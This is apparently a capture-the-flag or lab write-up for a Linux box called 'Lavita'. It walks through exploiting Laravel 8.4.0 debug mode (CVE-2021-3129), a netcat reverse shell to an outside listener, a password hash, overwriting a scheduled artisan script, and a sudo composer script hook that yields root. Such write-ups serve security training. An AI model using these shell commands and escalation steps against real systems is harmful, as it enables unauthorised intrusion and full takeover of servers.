# 🌱 Lavita (Linux)

> **Vector:** Laravel 8.4.0, Debug mode, PHP/Composer misconfig  
> _Difficulty: Intermediate_  
---

## 🔎 Initial Foothold

- Discovered `sitemap.xml` revealing the target runs **Laravel 8.4.0**.
- Tried public exploits without success. Registered a new user on the site, enabled debug, and then re-ran the [CVE-2021-3129](https://www.exploit-db.com/exploits/49424) exploit:
    ```bash
    python3 CVE-2021-3129.py
    # Payload to trigger reverse shell:
    nc -c /bin/sh 192.168.45.171 80
    ```
- Set up a listener on port 80 and received a reverse shell as the web user.
- Found multiple databases with the user `forge` and an exposed Redis service.
- Noted password hash: `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi`

---

## 🧑‍💻 Privilege Escalation

- Ran `linpeas.sh` and saw user **skunk** has sudo privileges.
- Used `pspy` and noticed that **skunk** runs the PHP script `/var/www/html/lavita/artisan` on a schedule.
    - Crafted a PHP reverse shell, overwrote `artisan`, and caught a shell as `skunk`.
- Checked `sudo -l`: **skunk** can run `composer` as root without a password.
    - Overwrote `/var/www/html/lavita/composer.json` with:
        ```bash
        echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
        sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
        ```
    - This executed a root shell via composer.

---

**Key Takeaways:**  
- 📜 Enumerate files like `sitemap.xml` for tech versions.  
- 🐘 Leverage debug modes in frameworks (Laravel) for RCE.  
- 🧑‍💻 Sudo misconfigs + writable scripts = root.  
- ⚡ PHP/Composer "script" hooks can be used for escalation if root privileges are allowed.

---

**Security Note:**  
> Never expose debug or development settings in production, and always restrict sudoers to minimal, audited actions.